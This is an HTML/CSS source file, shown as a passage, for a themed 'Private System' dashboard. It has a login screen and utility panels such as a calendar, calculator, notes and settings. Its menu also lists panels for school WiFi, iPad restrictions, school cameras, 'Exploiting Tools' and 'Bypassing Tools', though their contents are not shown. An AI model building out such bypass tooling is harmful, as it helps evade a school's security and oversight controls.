<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global CSS Variables for Theming */
    :root {
      --primary-bg: #1a1a1a;
      --secondary-bg: #2a2a2a;
      --tertiary-bg: #40210f;
      --text-color: #f9f2dc;
      --accent-color: #ff914d;
      --header-bg: #ff914d;
      --version-bg: #ffd966;
      --header-text: #000;
      --box-shadow-color: rgba(255, 145, 77, 0.3);
      --link-color: #000; /* for anchor tags within themed buttons */
      --panic-btn-bg: #ff4c4c;
      --panic-btn-color: white;
      --motivation-bg: #333;
      --motivation-text: #ffd966;
      --border-color: white;
      --login-box-shadow: 0 0 15px white;
      --input-bg: #1c1c1c;
      --popup-border: white;
      --popup-shadow: 0 0 20px white;
    }

    /* Light Theme */
    body.light-theme {
      --primary-bg: #f9f2dc;
      --secondary-bg: #ffd966;
      --tertiary-bg: #ffd999;
      --text-color: #1a1a1a;
      --accent-color: #994d00;
      --header-bg: #ffd966;
      --version-bg: #994d00;
      --header-text: #000;
      --box-shadow-color: rgba(153, 77, 0, 0.6);
      --link-color: #000;
      --motivation-bg: #fff3cc;
      --motivation-text: #994d00;
      --border-color: #333; /* Darker border for light mode login */
      --login-box-shadow: 0 0 15px rgba(0,0,0,0.3);
      --input-bg: #e0e0e0;
      --popup-border: #333;
      --popup-shadow: 0 0 20px rgba(0,0,0,0.3);
    }

    /* Blue Theme */
    body.blue-theme {
      --primary-bg: #2c3e50; /* Darker blue */
      --secondary-bg: #34495e;
      --tertiary-bg: #1a2a3a;
      --text-color: #ecf0f1; /* Light grey */
      --accent-color: #3498db; /* Bright blue */
      --header-bg: #3498db;
      --version-bg: #85c1e9;
      --header-text: #fff;
      --box-shadow-color: rgba(52, 152, 219, 0.4);
      --link-color: #fff;
      --panic-btn-bg: #e74c3c;
      --panic-btn-color: white;
      --motivation-bg: #4a6c8e;
      --motivation-text: #ecf0f1;
      --border-color: #3498db;
      --login-box-shadow: 0 0 15px #3498db;
      --input-bg: #1a2a3a;
      --popup-border: #3498db;
      --popup-shadow: 0 0 20px #3498db;
    }

    /* Green Theme */
    body.green-theme {
      --primary-bg: #2e8b57; /* Sea green */
      --secondary-bg: #3cb371; /* Medium sea green */
      --tertiary-bg: #225f3c;
      --text-color: #e0f2f1; /* Pale cyan */
      --accent-color: #66bb6a; /* Light green */
      --header-bg: #66bb6a;
      --version-bg: #9ccc65;
      --header-text: #000;
      --box-shadow-color: rgba(102, 187, 106, 0.4);
      --link-color: #000;
      --panic-btn-bg: #e74c3c;
      --panic-btn-color: white;
      --motivation-bg: #4db6ac;
      --motivation-text: #225f3c;
      --border-color: #66bb6a;
      --login-box-shadow: 0 0 15px #66bb6a;
      --input-bg: #1e603e;
      --popup-border: #66bb6a;
      --popup-shadow: 0 0 20px #66bb6a;
    }


    /* Login System Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body.login-body {
      margin: 0; padding: 0;
      background: var(--primary-bg);
      color: var(--text-color);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      transition: background-color 0.3s, color 0.3s; /* Smooth theme transitions */
    }

    .login-box {
      background: var(--primary-bg);
      border-radius: 20px;
      border: 3px solid var(--border-color);
      box-shadow: var(--login-box-shadow);
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: var(--border-color); box-shadow: var(--login-box-shadow); }
    }

    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: var(--text-color);
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--input-bg);
      border: none;
      color: var(--text-color);
      border-radius: 8px;
      font-size: 1em;
      transition: background-color 0.3s, color 0.3s;
    }

    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color);
    }

    #showPassword:checked + span {
      color: red;
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: red; /* Login button always red for severity */
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }
    .login-box button:active {
        transform: scale(0.98);
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: var(--primary-bg);
      border: 3px solid var(--popup-border);
      border-radius: 15px;
      box-shadow: var(--popup-shadow);
      z-index: 10;
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s, border-color 0.3s, box-shadow 0.3s;
    }

    .popup input {
      margin-bottom: 15px;
      background: var(--input-bg);
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s;
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--primary-bg);
      color: var(--text-color);
      padding: 20px;
      transition: background-color 0.5s ease, color 0.5s ease, zoom 0.2s ease; /* Smooth theme transition, zoom transition */
      zoom: 1; 
      min-height: 100vh; /* Ensure full height for background */
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--header-text);
      margin-bottom: 20px;
      transition: background-color 0.3s, color 0.3s;
    }

    .dashboard-header h1 {
      font-size: 24px;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: var(--version-bg);
      padding: 8px 15px;
      border-radius: 8px;
      color: var(--header-text);
      font-weight: bold;
      transition: background-color 0.3s, color 0.3s;
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
    }

    .quick-bar button, .quick-bar a, .small-btn {
      background-color: var(--accent-color);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: var(--header-text);
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
      min-width: 110px;
      white-space: nowrap;
      text-decoration: none; /* For quick bar links */
      display: flex; /* For centering text if any new icons are added */
      align-items: center;
      justify-content: center;
    }

    .quick-bar button:hover, .quick-bar a:hover, .small-btn:hover {
      background-color: var(--accent-color); /* Maintain accent on hover, consider a lighter shade or a hover accent variable */
      box-shadow: 0 0 8px var(--accent-color);
    }
    .quick-bar button:active, .quick-bar a:active, .small-btn:active {
        transform: scale(0.98);
        box-shadow: none;
    }

    #panicBtn {
      background: var(--panic-btn-bg) !important;
      color: var(--panic-btn-color) !important;
    }

    #panicBtn:hover {
        background-color: darken(var(--panic-btn-bg), 10%) !important; /* A darker shade on hover */
        box-shadow: 0 0 10px var(--panic-btn-bg);
    }


    .announcement-bar {
      width: 100%;
      background-color: var(--accent-color);
      color: var(--header-text);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      transition: background-color 0.3s, color 0.3s;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      transition: flex 0.3s;
    }

    /* Layout variants for settings */
    .main-row.grid-two {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 20px;
    }
    .main-row.grid-one {
        display: grid;
        grid-template-columns: 1fr;
        gap: 20px;
    }


    .box {
      background-color: var(--secondary-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s, transform 0.2s ease-out;
      flex: 1 1 300px;
    }
    .box:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 20px var(--box-shadow-color);
    }
    
    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--accent-color);
      transition: color 0.3s;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: var(--tertiary-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--tertiary-bg); /* Use tertiary for calendar cells for consistency */
      border-radius: 4px;
      transition: background-color 0.3s, color 0.3s;
    }

    .today {
      background: var(--accent-color) !important;
      font-weight: bold;
      color: var(--header-text);
      transition: background-color 0.3s, color 0.3s;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
    }

    #notesCanvas {
      border: 2px solid var(--accent-color);
      border-radius: 12px;
      background: #fff; /* Canvas background fixed white */
      cursor: crosshair;
      touch-action: none;
      transition: border-color 0.3s;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--accent-color);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: var(--header-text);
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--accent-color); /* keep original accent for better hover on theme colors */
      box-shadow: 0 0 8px var(--accent-color);
    }
    #canvasControls button:active {
        transform: scale(0.98);
        box-shadow: none;
    }

    .motivation-box {
      background-color: var(--motivation-bg);
      color: var(--motivation-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px var(--box-shadow-color);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--secondary-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      color: var(--text-color);
      /* Animations */
      transform: translateY(20px);
      opacity: 0;
      transition: opacity 0.4s ease-out, transform 0.4s ease-out, background-color 0.3s, color 0.3s, box-shadow 0.3s;
    }
    /* State for active panel */
    .info-panel.active {
      display: block; /* Important for actual visibility and layout */
      opacity: 1;
      transform: translateY(0);
    }
    /* If animations are disabled, just show/hide instantly */
    .info-panel.no-animation {
        transition: none;
        transform: none;
        opacity: 1; /* Instantly visible if display is block */
    }


    .info-panel h2 {
      color: var(--accent-color);
      margin-bottom: 15px;
      transition: color 0.3s;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: var(--tertiary-bg);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--tertiary-bg);
      border-radius: 6px;
      text-align: center;
      transition: background-color 0.3s;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); /* Make them more flexible */
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: var(--accent-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: var(--link-color);
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
      text-decoration: none;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: var(--accent-color); /* As above, a specific hover-accent or lighten() if SCSS was used */
      box-shadow: 0 0 8px var(--accent-color);
    }
    .handbook-buttons button:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active {
        transform: scale(0.98);
        box-shadow: none;
    }


    .coming-soon {
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    .info-text {
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    .school-info-grid, .profile-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item, .profile-item {
      background: var(--tertiary-bg);
      padding: 12px;
      border-radius: 8px;
      transition: background-color 0.3s;
    }

    .school-info-label, .profile-label {
      font-weight: bold;
      color: var(--accent-color);
      margin-bottom: 5px;
      display: block;
      transition: color 0.3s;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      flex-wrap: wrap; /* Added for responsiveness */
    }

    .ipad-options button {
      flex: 1;
      min-width: 120px; /* Ensure buttons don't become too small */
      background-color: var(--accent-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: var(--link-color);
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
    }

    .ipad-options button:hover {
      background-color: var(--accent-color);
      box-shadow: 0 0 8px var(--accent-color);
    }
    .ipad-options button:active {
        transform: scale(0.98);
        box-shadow: none;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--tertiary-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    /* Preloader Styles */
    .preloader {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-size: 2.5em;
      font-family: 'Courier New', monospace;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.8s ease-out, visibility 0.8s ease-out;
      text-align: center;
    }
    .preloader.active {
      opacity: 1;
      visibility: visible;
    }
    .preloader .loader-text {
        overflow: hidden;
        white-space: nowrap;
        margin: 0 auto;
        letter-spacing: .15em;
        border-right: .15em solid orange;
        max-width: 0;
        animation: typing 3s steps(30, end) forwards,
                   blink-caret .75s step-end infinite;
    }
    .preloader.fade-out .loader-text {
        animation: none; /* Stop typing and blinking */
        border-right: none;
    }

    @keyframes typing {
      from { max-width: 0 }
      to { max-width: 100% }
    }
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: orange }
    }
    
    /* Notification Toast System */
    #notification-toast-container {
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 100;
        display: flex;
        flex-direction: column-reverse; /* Newest at bottom */
        gap: 10px;
        pointer-events: none; /* Allow clicks to pass through */
    }
    .notification-toast {
        background-color: rgba(51, 51, 51, 0.9);
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        opacity: 0;
        transform: translateY(20px);
        animation: toast-fade-in 0.3s ease-out forwards, toast-fade-out 0.5s ease-in var(--toast-display-duration, 3s) forwards;
        max-width: 300px;
        word-wrap: break-word;
    }

    @keyframes toast-fade-in {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }
    @keyframes toast-fade-out {
        from { opacity: 1; transform: translateY(0); }
        to { opacity: 0; transform: translateY(20px); }
    }

    /* Settings panel styling */
    .setting-group {
        background-color: var(--tertiary-bg);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 15px;
        transition: background-color 0.3s;
    }
    .setting-group h3 {
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 10px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        padding-bottom: 8px;
        transition: color 0.3s;
    }
    .setting-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 10px;
        padding: 5px 0;
        flex-wrap: wrap; /* Ensure responsiveness */
    }
    .setting-item label {
        flex: 1;
        min-width: 150px;
        margin-right: 10px;
        color: var(--text-color);
        transition: color 0.3s;
    }
    .setting-item input[type="checkbox"] {
        width: auto;
        margin: 0;
        padding: 0;
        accent-color: var(--accent-color); /* Tint checkbox */
    }
    .setting-item select, .setting-item input[type="color"] {
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #555;
        background-color: var(--input-bg);
        color: var(--text-color);
        flex: 1;
        min-width: 120px;
        transition: background-color 0.3s, color 0.3, border-color 0.3s;
    }
    /* Special button styling within settings */
    .settings-button {
        background-color: var(--accent-color);
        color: var(--header-text);
        padding: 8px 15px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        transition: background-color 0.2s, transform 0.1s;
        margin-top: 5px;
        display: inline-block;
    }
    .settings-button:hover {
        background-color: var(--accent-color);
        box-shadow: 0 0 5px var(--accent-color);
    }
    .settings-button:active {
        transform: scale(0.98);
    }

    /* Reminder list */
    #remindersList li {
        background: var(--tertiary-bg);
        margin-bottom: 8px;
        padding: 10px;
        border-radius: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        color: var(--text-color);
        transition: background-color 0.3s, transform 0.2s;
    }
    #remindersList li.completed {
        text-decoration: line-through;
        opacity: 0.7;
    }
    #remindersList li .reminder-text {
        flex-grow: 1;
        margin-right: 10px;
    }
    #remindersList li .reminder-actions {
        display: flex;
        gap: 5px;
    }
    #remindersList li button {
        background: var(--accent-color);
        color: var(--header-text);
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    #remindersList li button.delete {
        background: #e74c3c;
    }
    #remindersList li button:hover {
        opacity: 0.9;
    }
    /* Task List */
    #tasksList li {
        background: var(--tertiary-bg);
        margin-bottom: 8px;
        padding: 10px;
        border-radius: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        color: var(--text-color);
        transition: background-color 0.3s, transform 0.2s;
    }
    #tasksList li.completed {
        text-decoration: line-through;
        opacity: 0.7;
    }
    #tasksList li .task-text {
        flex-grow: 1;
        margin-right: 10px;
    }
    #tasksList li .task-actions {
        display: flex;
        gap: 5px;
    }
    #tasksList li button {
        background: var(--accent-color);
        color: var(--header-text);
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    #tasksList li button.delete {
        background: #e74c3c;
    }
    #tasksList li button:hover {
        opacity: 0.9;
    }


    /* Calculator styles */
    .calculator-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
        margin-top: 15px;
        padding: 10px;
        background-color: var(--tertiary-bg);
        border-radius: 10px;
    }
    .calc-display {
        grid-column: 1 / -1;
        background-color: var(--input-bg);
        color: var(--text-color);
        border: 1px solid #555;
        border-radius: 8px;
        padding: 15px;
        font-size: 2em;
        text-align: right;
        margin-bottom: 10px;
    }
    .calculator-grid button {
        background-color: var(--accent-color);
        color: var(--header-text);
        border: none;
        padding: 15px;
        border-radius: 8px;
        font-size: 1.2em;
        cursor: pointer;
        transition: background-color 0.2s, transform 0.1s;
    }
    .calculator-grid button:hover {
        opacity: 0.9;
    }
    .calculator-grid button:active {
        transform: scale(0.95);
    }
    .calculator-grid button:nth-last-child(2),
    .calculator-grid button:nth-last-child(3) {
        grid-column: span 2;
    }


    /* Unit Converter styles */
    .unit-convert-section {
        background-color: var(--tertiary-bg);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 15px;
        transition: background-color 0.3s;
    }
    .unit-convert-section h3 {
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 10px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        padding-bottom: 8px;
        transition: color 0.3s;
    }
    .unit-convert-section input,
    .unit-convert-section select {
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #555;
        background-color: var(--input-bg);
        color: var(--text-color);
        margin: 0 5px 10px 0;
        transition: background-color 0.3s, color 0.3s, border-color 0.3s;
    }
    .unit-convert-section p {
        margin-top: 10px;
        font-weight: bold;
    }
    .unit-convert-section span {
        color: var(--text-color);
        transition: color 0.3s;
    }
    
    /* Weather display styles */
    .weather-display {
        background-color: var(--tertiary-bg);
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        margin-top: 15px;
        transition: background-color 0.3s;
    }
    .weather-display p {
        margin-bottom: 8px;
        font-size: 1.1em;
        color: var(--text-color);
    }
    .weather-display span {
        font-weight: bold;
        color: var(--accent-color);
        transition: color 0.3s;
    }
    .weather-display .small-text {
        font-size: 0.8em;
        opacity: 0.8;
        margin-top: 15px;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

</head>
<body class="login-body" id="bodyElement">

  <!-- Pre-loader Elements -->
  <div class="preloader active" id="systemLoader">
    <div class="loader-text" id="systemLoaderText">Initializing System...</div>
  </div>
  <div class="preloader" id="keySystemLoader" style="display:none;">
    <div class="loader-text" id="keySystemLoaderText">Loading Key System...</div>
  </div>
  <div class="preloader" id="dashboardLoader" style="display:none;">
    <div class="loader-text" id="dashboardLoaderText">Loading Dashboard...</div>
  </div>

  <!-- Notification Toast Container -->
  <div id="notification-toast-container"></div>

  <!-- Login System (hidden by default to allow preloaders to run) -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 2.0.0</div> <!-- Updated version number -->
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Main Grid</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
      <!-- New quick panel buttons -->
      <button id="toggleAnnouncementsBtn">📢 Toggle Announcements</button>
      <button id="toggleUpdatesBtn">💡 Toggle Updates/Notifications</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI V2.0.0! Explore new features like Settings, Reminders, and a Calculator! 🚨</span>
    </div>

    <div class="main-row" id="mainGrid">
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "The only way to do great work is to love what you do." – Steve Jobs
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update! (v2.0.0)</div>
        <div class="update-entry">New Settings Panel Added</div>
        <div class="update-entry">Reminder System Integrated</div>
        <div class="update-entry">Interactive Calculator & Unit Converter</div>
        <div class="update-entry">Pre-loading Animations Deployed</div>
        <div class="update-entry">Button Press Notifications Implemented</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Your journey with the Private System is constantly evolving. Discover new tools and features regularly!</p>
      </div>
    </div>

    <!-- Additional button row for information panels - this is where settings, reminders etc live -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('settingsPanel', this)">⚙️ Settings</button>
      <button onclick="dashboard.togglePanel('remindersPanel', this)">⏰ Reminders</button>
      <button onclick="dashboard.togglePanel('taskManagerPanel', this)">✅ Task Manager</button>
      <button onclick="dashboard.togglePanel('calculatorPanel', this)">🧮 Calculator</button>
      <button onclick="dashboard.togglePanel('unitConverterPanel', this)">🔄 Unit Converter</button>
      <button onclick="dashboard.togglePanel('weatherPanel', this)">☀️ Weather Info</button>
      <button onclick="dashboard.togglePanel('profilePanel', this)">👤 Profile Manager</button>
      <button onclick="dashboard.togglePanel('vpnPanel', this)">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel', this)">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel', this)">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel', this)">🎹 Keyboard Tricks</button>
      <!-- Original buttons -->
      <button onclick="dashboard.togglePanel('wifiPanel', this)">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel', this)">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel', this)">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel', this)">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel', this)">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel', this)">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel', this)">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel', this)">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel', this)">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel', this)">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel', this)">🚪 Bypassing Tools</button>
    </div>

    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- SETTINGS PANEL (New) -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ System Settings</h2>
        <div class="setting-group">
          <h3>Theme Settings</h3>
          <div class="setting-item">
            <label for="themeSelect">Select Theme:</label>
            <select id="themeSelect" onchange="dashboard.applyTheme(this.value)">
              <option value="dark">🌙 Dark Mode</option>
              <option value="light">☀️ Light Mode</option>
              <option value="blue">🔵 Blue Mode</option>
              <option value="green">🟢 Green Mode</option>
            </select>
          </div>
          <div class="setting-item">
            <label for="animatePanels">Enable Panel Animations:</label>
            <input type="checkbox" id="animatePanels" checked onchange="dashboard.togglePanelAnimations(this.checked)">
          </div>
          <div class="setting-item">
              <label for="animateQuickButtons">Enable Quick Button Hover Animation:</label>
              <input type="checkbox" id="animateQuickButtons" checked onchange="dashboard.toggleButtonHoverAnimation(this.checked, '.quick-bar button, .quick-bar a')">
          </div>
        </div>

        <div class="setting-group">
            <h3>Notification Settings</h3>
            <div class="setting-item">
                <label for="enableNotifications">Enable Button Press Notifications:</label>
                <input type="checkbox" id="enableNotifications" checked onchange="dashboard.toggleNotifications(this.checked)">
            </div>
            <div class="setting-item">
                <label for="notificationDuration">Notification Display Duration (seconds):</label>
                <input type="number" id="notificationDuration" value="3" min="1" max="10" onchange="dashboard.setNotificationDuration(this.value)">
            </div>
            <button class="settings-button" onclick="dashboard.clearAllNotifications()">Clear All Notifications</button>
        </div>

        <div class="setting-group">
          <h3>Dashboard Layout</h3>
          <div class="setting-item">
            <label for="layoutStyle">Main Grid Content Layout:</label>
            <select id="layoutStyle" onchange="dashboard.updateDashboardLayout(this.value)">
                <option value="flex">Default Flex (Responsive)</option>
                <option value="grid-two">Two Column Grid</option>
                <option value="grid-one">Single Column</option>
            </select>
          </div>
          <div class="setting-item">
            <label for="resetLayout">Reset Layout to Default:</label>
            <button class="settings-button" onclick="dashboard.resetLayoutSettings()">Reset</button>
          </div>
        </div>

        <div class="setting-group">
            <h3>Date & Time Display</h3>
            <div class="setting-item">
                <label for="dateFormat">Date Format:</label>
                <select id="dateFormat" onchange="dashboard.setDateFormat(this.value)">
                    <option value="MM/DD/YYYY">MM/DD/YYYY (e.g., 08/23/2025)</option>
                    <option value="DD/MM/YYYY">DD/MM/YYYY (e.g., 23/08/2025)</option>
